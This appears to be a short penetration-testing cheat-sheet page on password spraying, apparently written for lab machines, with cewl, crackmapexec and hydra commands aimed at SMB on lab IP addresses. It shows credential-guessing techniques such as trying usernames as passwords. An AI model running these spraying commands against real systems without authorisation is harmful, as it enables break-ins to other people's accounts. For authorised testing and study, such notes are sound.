# Spraying

Based on the users that you have you could try to make a list of the usernames and use cme to see if they used their username as passwords.&#x20;

\<username:username>

\<name>:\<their normal name>&#x20;

Use cewl on their website just in case as well.&#x20;

```
cewl http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers > wordlist
```

```
crackmapexec smb 10.10.10.172 -u userlist.txt -p passlist
```

Spray SMB just in case.&#x20;

```
hydra -L userlist.txt -P passlist.txt 10.10.10.193 smb
```
